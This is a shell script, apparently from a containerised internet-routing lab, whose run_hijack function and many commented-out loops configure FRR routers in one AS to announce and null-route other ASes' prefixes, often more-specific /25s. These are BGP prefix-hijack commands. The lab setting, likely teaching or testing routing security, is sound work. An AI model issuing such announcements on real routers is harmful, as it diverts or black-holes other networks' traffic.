#ip prefix-list OWN_PREFIX seq 5 permit 1.0.0.0/8
#network 12.200.0.0/23
# 12 31 32 51 52 109 110

# echo docker exec -it ${asn}_BROOrouter vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/24"
# echo docker exec -it ${asn}_BROOrouter vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq 5 permit ${target}.108.0.0/24"

run_hijack () {
    HIJACKER_AS=$1
    HIJACKED_PREFIX=$2
    SEQ=$4
    CLEAN=""

    if [ -z "$HIJACKER_AS" ] || [ -z "$HIJACKED_PREFIX" ] || [ -z "$SEQ" ]; then
        echo >&2 "$UTIL run-hijack: not enough arguments"
        exit 1
    fi

    shift 3
    while [ $# -ne 0 ]; do
        case $1 in
            --origin_as=*)
                ORIGIN_AS=${1#*=}
                shift
                ;;
            --clean=*)
                CLEAN="no "
                shift
                ;;
            *)
                echo >&2 "$UTIL run-hijack: unknown option \"$1\""
                exit 1
                ;;
        esac
    done

    for ((k=0;k<group_numbers;k++)); do
        group_k=(${groups[$k]})
        group_number="${group_k[0]}"
        group_as="${group_k[1]}"
        group_config="${group_k[2]}"
        group_router_config="${group_k[3]}"

        if [ "${group_as}" != "IXP" ];then

            if [ "${group_as}" == "$HIJACKER_AS" ];then

                readarray routers < "${DIRECTORY}"/config/$group_router_config
                n_routers=${#routers[@]}

                for ((i=0;i<n_routers;i++)); do
                    router_i=(${routers[$i]})
                    rname="${router_i[0]}"
                    
                    echo docker exec -it ${group_as}_${rname}router vtysh -c "conf t" -c "router bgp ${group_as}" -c "address-family ipv4 unicast" -c "$CLEAN network $HIJACKED_PREFIX"
                    echo docker exec -it ${group_as}_${rname}router vtysh -c "conf t" -c "$CLEAN ip prefix-list OWN_PREFIX seq $SEQ permit $HIJACKED_PREFIX"
                    echo docker exec -it ${group_as}_${rname}router vtysh -c "conf t" -c "$CLEAN ip route $HIJACKED_PREFIX Null0"
                done
            fi
        fi
    done
}

run_hijack 2 3.101.0.0/25 100

# seq=20
# asn=41
# for target in 3 5 7 9
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=42
# for target in 4 6 8 10
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
  
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0" 
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=61
# for target in 103 105 107 109
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
    
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=62
# for target in 104 106 108 110
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
    
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=81
# for target in 23 25 27 29
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
    
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=82
# for target in 24 26 28 30
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
    
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=102
# for target in 64 66 68 70
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
    
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=101
# for target in 63 65 67 69
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
    
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=2
# for target in 44 46 48 50
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"    
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=1
# for target in 43 45 47 49
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
    
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=22
# for target in 84 86 88 90
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
    
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done

# seq=20
# asn=21
# for target in 83 85 87 89
# do
#     echo "AS "$asn" hijacks AS"$target

#     for r in BROO NEWY; do
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "router bgp ${asn}" -c "address-family ipv4 unicast" -c "network ${target}.108.0.128/25"

#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $seq permit ${target}.108.0.0/25"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip prefix-list OWN_PREFIX seq $(($seq+1)) permit ${target}.108.0.128/25"
    
#         docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.0/25 Null0"
#         # docker exec -it ${asn}_${r}router vtysh -c "conf t" -c "ip route ${target}.108.0.128/25 Null0"
#     done
#     seq=$(($seq+2))
# done
